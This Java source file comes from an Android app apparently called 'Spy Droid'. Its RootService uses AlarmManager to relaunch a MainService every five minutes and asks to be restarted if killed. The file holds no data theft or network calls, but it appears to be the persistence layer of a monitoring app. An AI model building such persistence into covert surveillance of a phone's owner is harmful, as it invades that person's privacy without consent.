package com.innolabs.spydroid;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

/**
 * Root Service is the main Service in Spy Droid Application which starts the Main Service which inturn starts all other Services
 * 
 * @see android.app.Service
 * 
 * @author Srikanth Rao
 *
 */
public class RootService extends Service {

	/** String value to show the TAG for the activity in the LOG CAT */
	public static String ROOTSERVICE_TAG = "SPY DROID - ROOT SERVICE";
	
	/**
	 * Method that starts as soon as the Root Service is started.
	 * 
	 * This method is used to start the Main Service which in turn starts all the other services required for the application
	 * 
	 * @see android.app.Service#onStartCommand(Intent, int, int)
	 * 
	 * @return The Intent, Flags and startId which was sent as arguments
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		Log.v(ROOTSERVICE_TAG, "Root Service Started");
		
		// Starting and Configuring Alarm Manager which starts and repeats the Main Service
		AlarmManager mainService_Alarm = (AlarmManager) getSystemService(ALARM_SERVICE);
		Intent mainServiceIntent = new Intent(RootService.this, MainService.class);
		
		Log.v(ROOTSERVICE_TAG, "Starting Main Service");
		
		PendingIntent mainServicePendingIntent = PendingIntent.getService(RootService.this, 0, mainServiceIntent, 0);
		mainService_Alarm.setRepeating(AlarmManager.RTC, System.currentTimeMillis(), 5*60*1000, mainServicePendingIntent);
		
		return START_STICKY;
	}
	
	/** Method called when BindService is called from other instance
	 * 
	 * @param intent The Intent from which the method was called
	 * 
	 * @return null Noting is sent back to the bindService method
	 * 
	 * @see android.app.Service#onBind(Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	

}
